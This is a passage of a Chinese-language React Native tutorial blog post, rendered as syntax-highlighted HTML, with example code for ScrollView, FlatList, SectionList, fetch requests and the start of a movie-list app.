&lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;Scrolling down&lt;/Text&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;What'</span>s the best&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Image source=&#123;require('./</span><span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;Framework around?&lt;/Text&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Text style=&#123;&#123;fontSize:80&#125;&#125;&gt;React Native&lt;/Text&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;/ScrollView&gt;</span></span><br><span class=\"line\"><span class=\"string\">  );</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><code>ScrollView</code>适合用来显示数量不多的滚动元素。放置在<code>ScrollView</code>中的所有组件都会被渲染，哪怕有些组件因为内容太长被挤出了屏幕外。</p>\n<h2 id=\"长列表\"><a href=\"#长列表\" class=\"headerlink\" title=\"长列表\"></a>长列表</h2><p><code>FlatList</code>组件用于显示一个==垂直的滚动列表==，其中的元素之间结构近似而仅数据不同。</p>\n<p><code>FlatList</code>更适于==长列表数据，且元素个数可以增删。==和<a href=\"https://reactnative.cn/docs/using-a-scrollview\" target=\"_blank\" rel=\"noopener\"><code>ScrollView</code></a>不同的是，<code>FlatList</code>并==不立即渲染所有元素，而是优先渲染屏幕上可见的元素。==</p>\n<p><code>FlatList</code>组件必须的两个属性是<code>data</code>和<code>renderItem</code>。<code>data</code>是列表的数据源，而<code>renderItem</code>则从数据源中逐个解析数据，然后返回一个设定好格式的组件来渲染。</p>\n<p><img src=\"/view/posts/e61ae078/FlatList.gif\" alt=\"FlatList\" style=\"zoom:50%;\"></p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> styles = StyleSheet.create(&#123;</span><br><span class=\"line\">      container: &#123;</span><br><span class=\"line\">       flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">       paddingTop: <span class=\"number\">22</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      item: &#123;</span><br><span class=\"line\">        padding: <span class=\"number\">10</span>,</span><br><span class=\"line\">        fontSize: <span class=\"number\">18</span>,</span><br><span class=\"line\">        height: <span class=\"number\">44</span>,</span><br><span class=\"line\">        borderBottomColor: <span class=\"string\">'#f0f'</span>,</span><br><span class=\"line\">        borderBottomWidth: <span class=\"number\">1</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    <span class=\"keyword\">const</span> arr = [ &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Devin'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Julie'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Dan'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Dominic'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jackson'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'James'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Joel'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'John'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jillian'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jimmy'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Dan'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Dominic'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jackson'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'James'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Joel'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'John'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jillian'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jimmy'</span>&#125;,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &lt;FlatList</span><br><span class=\"line\">          data=&#123; arr &#125;</span><br><span class=\"line\">          renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text style=&#123;styles.item&#125;&gt;&#123;item.key&#125;&lt;/Text&gt;&#125;</span><br><span class=\"line\">        /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>如果要渲染的是一组需要分组的数据，也许还带有分组标签的，那么<code>SectionList</code>将是个不错的选择</p>\n<p><img src=\"/view/posts/e61ae078/SectionList.gif\" alt=\"SectionList\" style=\"zoom:50%;\"></p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> arr = [</span><br><span class=\"line\">      &#123;<span class=\"attr\">title</span>: <span class=\"string\">'A'</span>, <span class=\"attr\">data</span>: [<span class=\"string\">'Aevin'</span>, <span class=\"string\">'Aan'</span>, <span class=\"string\">'Aominic'</span>]&#125;,</span><br><span class=\"line\">      &#123;<span class=\"attr\">title</span>: <span class=\"string\">'B'</span>, <span class=\"attr\">data</span>: [<span class=\"string\">'Bevin'</span>, <span class=\"string\">'Ban'</span>, <span class=\"string\">'Bominic'</span>]&#125;,</span><br><span class=\"line\">      &#123;<span class=\"attr\">title</span>: <span class=\"string\">'D'</span>, <span class=\"attr\">data</span>: [<span class=\"string\">'Devin'</span>, <span class=\"string\">'Dan'</span>, <span class=\"string\">'Dominic'</span>]&#125;,</span><br><span class=\"line\">      &#123;<span class=\"attr\">title</span>: <span class=\"string\">'J'</span>, <span class=\"attr\">data</span>: [<span class=\"string\">'Jackson'</span>, <span class=\"string\">'James'</span>, <span class=\"string\">'Jillian'</span>, <span class=\"string\">'Jimmy'</span>, <span class=\"string\">'Joel'</span>, <span class=\"string\">'John'</span>, <span class=\"string\">'Julie'</span>]&#125;,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &lt;SectionList</span><br><span class=\"line\">          sections=&#123;arr&#125;</span><br><span class=\"line\">          renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text style=&#123;styles.item&#125;&gt;&#123;item&#125;&lt;/Text&gt;&#125;</span><br><span class=\"line\">          renderSectionHeader=&#123;(&#123;section&#125;) =&gt; &lt;Text style=&#123;styles.sectionHeader&#125;&gt;&#123;section.title&#125;&lt;/Text&gt;&#125;</span><br><span class=\"line\">          keyExtractor=&#123;(item, index) =&gt; index&#125;</span><br><span class=\"line\">        /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">const styles = StyleSheet.create(&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  container: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">   flex: 1,</span></span><br><span class=\"line\"><span class=\"regexp\">   paddingTop: 22</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  sectionHeader: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    paddingTop: 2,</span></span><br><span class=\"line\"><span class=\"regexp\">    paddingLeft: 10,</span></span><br><span class=\"line\"><span class=\"regexp\">    paddingRight: 10,</span></span><br><span class=\"line\"><span class=\"regexp\">    paddingBottom: 2,</span></span><br><span class=\"line\"><span class=\"regexp\">    fontSize: 14,</span></span><br><span class=\"line\"><span class=\"regexp\">    fontWeight: 'bold',</span></span><br><span class=\"line\"><span class=\"regexp\">    backgroundColor: 'rgba(247,247,247,1.0)',</span></span><br><span class=\"line\"><span class=\"regexp\">    borderTopWidth: 1,</span></span><br><span class=\"line\"><span class=\"regexp\">    borderTopColor: '#db5420'</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  item: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    padding: 10,</span></span><br><span class=\"line\"><span class=\"regexp\">    fontSize: 18,</span></span><br><span class=\"line\"><span class=\"regexp\">    height: 44,</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;)</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"网络（进行中）\"><a href=\"#网络（进行中）\" class=\"headerlink\" title=\"网络（进行中）\"></a>网络（进行中）</h2><h3 id=\"使用-Fetch\"><a href=\"#使用-Fetch\" class=\"headerlink\" title=\"使用 Fetch\"></a>使用 Fetch</h3><h4 id=\"发起请求\"><a href=\"#发起请求\" class=\"headerlink\" title=\"发起请求\"></a>发起请求</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">'https://mywebsite.com/endpoint/'</span>, &#123;</span><br><span class=\"line\">  method: <span class=\"string\">'POST'</span>,</span><br><span class=\"line\">  headers: &#123;</span><br><span class=\"line\">    Accept: <span class=\"string\">'application/json'</span>,</span><br><span class=\"line\">    <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/json'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  body: <span class=\"built_in\">JSON</span>.stringify(&#123;</span><br><span class=\"line\">    firstParam: <span class=\"string\">'yourValue'</span>,</span><br><span class=\"line\">    secondParam: <span class=\"string\">'yourOtherValue'</span>,</span><br><span class=\"line\">  &#125;),</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"处理服务器的响应数据\"><a href=\"#处理服务器的响应数据\" class=\"headerlink\" title=\"处理服务器的响应数据\"></a>处理服务器的响应数据</h4><p>Fetch 方法会返回一个<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise\" target=\"_blank\" rel=\"noopener\">Promise</a>，这种模式可以简化异步风格的代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getMoviesFromApiAsync</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> fetch(<span class=\"string\">'https://facebook.github.io/react-native/movies.json'</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> response.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">responseJson</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> responseJson.movies;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    .catch(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.error(error);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// async/await 语法：</span></span><br><span class=\"line\"><span class=\"comment\">// 注意这个方法前面有async关键字</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getMoviesFromApi</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 注意这里的await语句，其所在的函数必须有async关键字声明</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> response = <span class=\"keyword\">await</span> fetch(</span><br><span class=\"line\">      <span class=\"string\">'https://facebook.github.io/react-native/movies.json'</span>,</span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">let</span> responseJson = <span class=\"keyword\">await</span> response.json();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> responseJson.movies;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.error(error);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>测试(catch 住<code>fetch</code>可能抛出的异常)</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state =&#123; <span class=\"attr\">isLoading</span>: <span class=\"literal\">true</span>&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  componentDidMount()&#123;</span><br><span class=\"line\">    <span class=\"comment\">//  *****************</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> fetch(<span class=\"string\">'https://facebook.github.io/react-native/movies.json'</span>)</span><br><span class=\"line\">      .then(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> response.json())</span><br><span class=\"line\">      .then(<span class=\"function\">(<span class=\"params\">responseJson</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">          isLoading: <span class=\"literal\">false</span>,</span><br><span class=\"line\">          dataSource: responseJson.movies,</span><br><span class=\"line\">        &#125;, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">      .catch(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.error(error);</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  render()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">this</span>.state.isLoading)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span>(</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">flex</span>: <span class=\"number\">1</span>, <span class=\"attr\">padding</span>: <span class=\"number\">20</span>&#125;&#125;&gt;</span><br><span class=\"line\">          &lt;ActivityIndicator/&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      )</span></span><br><span class=\"line\"><span class=\"regexp\">    &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">    return(</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;View style=&#123;&#123;flex: 1, paddingTop:20&#125;&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;FlatList</span></span><br><span class=\"line\"><span class=\"regexp\">          data=&#123;this.state.dataSource&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text&gt;&#123;item.title&#125;, &#123;item.releaseYear&#125;&lt;/</span>Text&gt;&#125;</span><br><span class=\"line\">          keyExtractor=&#123;(item, index) =&gt; item.id&#125;</span><br><span class=\"line\">        /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>从 Android9 开始，也会默认阻止 http 请求，请参考<a href=\"https://blog.csdn.net/qq_40347548/article/details/86766932\" target=\"_blank\" rel=\"noopener\">相关配置</a></p>\n</blockquote>\n<blockquote>\n<p>默认情况下，iOS 会阻止所有 http 的请求，以督促开发者使用 https。如果你仍然需要使用 http 协议，那么首先需要添加一个 App Transport Security 的例外，详细可参考<a href=\"https://segmentfault.com/a/1190000002933776\" target=\"_blank\" rel=\"noopener\">这篇帖子</a>。</p>\n</blockquote>\n<h3 id=\"使用其他的网络库\"><a href=\"#使用其他的网络库\" class=\"headerlink\" title=\"使用其他的网络库\"></a>使用其他的网络库</h3><p>React Native 中已经内置了<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest\" target=\"_blank\" rel=\"noopener\">XMLHttpRequest API</a>(也就是俗称的 ajax)。一些基于 XMLHttpRequest 封装的第三方库也可以使用，例如<a href=\"https://github.com/niftylettuce/frisbee\" target=\"_blank\" rel=\"noopener\">frisbee</a>或是<a href=\"https://github.com/mzabriskie/axios\" target=\"_blank\" rel=\"noopener\">axios</a>等。但注意不能使用 jQuery。</p>\n<blockquote>\n<p>在应用中你可以访问任何网站，没有<a href=\"http://en.wikipedia.org/wiki/Cross-origin_resource_sharing\" target=\"_blank\" rel=\"noopener\">跨域</a>的限制。</p>\n</blockquote>\n<h2 id=\"电影列表\"><a href=\"#电影列表\" class=\"headerlink\" title=\"电影列表\"></a>电影列表</h2><blockquote>\n<p>在一个<code>FlatList</code>中展示出电影列表。</p>\n</blockquote>\n<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>使用<code>cli</code>工具创建一个工程：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">react-native init SampleAppMovies</span><br></pre></td></tr></table></figure>\n<p>这条命令除了会下载<code>js</code>文件，还会下载在<code>SampleAppMovies/iOS/SampleAppMovies.xcodeproj</code>和<code>SampleAppMovies/android/app</code>下分别创建一个新的 XCode 工程(iOS)和一个 gradle 工程(Android)。</p>\n<h3 id=\"开发\"><a href=\"#开发\" class=\"headerlink\" title=\"开发\"></a>开发</h3><p><code>Android</code>版本：先连接设备或启动模拟器，然后在<code>SampleAppMovies</code>目录下运行<code>react-native run-android</code>，就会构建工程。</p>\n<h4 id=\"电影列表-1\"><a href=\"#电影列表-1\" class=\"headerlink\" title=\"电影列表\"></a>电影列表</h4><p><img src=\"/view/posts/e61ae078/movielist.gif\" alt=\"movielist\" style=\"zoom:50%;\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span 